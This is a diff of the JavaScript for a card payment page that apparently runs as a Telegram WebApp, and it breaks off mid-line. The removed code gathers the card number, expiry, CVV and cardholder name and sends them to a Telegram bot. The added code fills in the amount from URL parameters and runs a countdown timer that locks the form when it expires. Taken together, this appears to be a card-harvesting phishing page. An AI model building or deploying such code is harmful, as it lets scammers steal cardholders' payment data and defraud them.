@@ -1,52 +1,51 @@
-// --- Form Submission ---
-paymentForm.addEventListener('submit', function (e) {
-    e.preventDefault();
+// script.js
+document.addEventListener('DOMContentLoaded', function () {
+    // --- Elements ---
+    const countdownElement = document.getElementById('countdown');
+    const amountValueElement = document.getElementById('amountValue');
+    const paymentIdElement = document.getElementById('paymentId');
+    const payAmountElement = document.getElementById('payAmount');
+    const cardNumberInput = document.getElementById('cardNumber');
+    const expiryInput = document.getElementById('expiry');
+    const cvvInput = document.getElementById('cvv');
+    const cardHolderInput = document.getElementById('cardHolder');
+    const paymentForm = document.getElementById('paymentForm');
 
-    // Basic validation
-    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
-        alert('Please fill in all fields.');
-        return;
+    // --- Get URL Parameters ---
+    const urlParams = new URLSearchParams(window.location.search);
+    const transactionId = urlParams.get('transaction_id');
+    const amount = urlParams.get('amount');
+    const paymentId = urlParams.get('payment_id');
+
+    // --- Initialize Page Data ---
+    if (amount) {
+        amountValueElement.textContent = parseFloat(amount).toFixed(2);
+        payAmountElement.textContent = `${parseFloat(amount).toFixed(2)} USD`;
+    }
+    if (paymentId) {
+        paymentIdElement.textContent = paymentId;
     }
 
-    // Prepare data to send back to the bot
-    const formData = {
-        transaction_id: transactionId,
-        amount: amount,
-        payment_id: paymentId,
-        cardNumber: cardNumberInput.value.trim(),
-        expiry: expiryInput.value.trim(),
-        cvv: cvvInput.value.trim(),
-        cardHolder: cardHolderInput.value.trim()
-    };
+    // --- Countdown Timer ---
+    let totalSeconds = 29 * 60 + 4; // 29 minutes and 4 seconds
 
-    console.log("FormData:", formData);
+    function updateCountdown() {
+        const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
+        const seconds = (totalSeconds % 60).toString().padStart(2, '0');
+        countdownElement.textContent = `${minutes}:${seconds}`;
 
-    // Check if Telegram WebApp is available
-    if (window.Telegram && window.Telegram.WebApp) {
-        console.log("Telegram WebApp detected!");
-        const tg = window.Telegram.WebApp;
-        
-        try {
-            console.log("Sending data...");
-            tg.sendData(JSON.stringify(formData));
-            
-            paymentForm.innerHTML = `
-                <p style="color:green; text-align:center; font-size: 18px;">
-                    ✅ Payment data sent successfully!<br>
-                    Closing payment window...
-                </p>
-            `;
-            
-            setTimeout(() => {
-                tg.close();
-            }, 2000);
-            
-        } catch (error) {
-            console.error("Error sending data:", error);
-            paymentForm.innerHTML = `<p style="color:red; text-align:center;">❌ Error sending payment data.</p>`;
+        if (totalSeconds > 0) {
+            totalSeconds--;
+        } else {
+            countdownElement.textContent = "00:00";
+            paymentForm.querySelector('button[type="submit"]').disabled = true;
+            paymentForm.innerHTML += `<p style="color:red; text-align:center;">Session expired. Please restart the payment.</p>`;
         }
-    } else {
-        console.warn("Telegram WebApp not found. Data may not be sent.");
-        paymentForm.innerHTML = `<p style="color:orange; text-align:center;">⚠️ Payment simulation completed.<br>Cannot close window outside Telegram.</p>`;
     }
-});
+
+    // Update every second
+    const timerInterval = setInterval(updateCountdown, 1000);
+
+    // --- Card Number Formatting ---
+    cardNumberInput.addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D
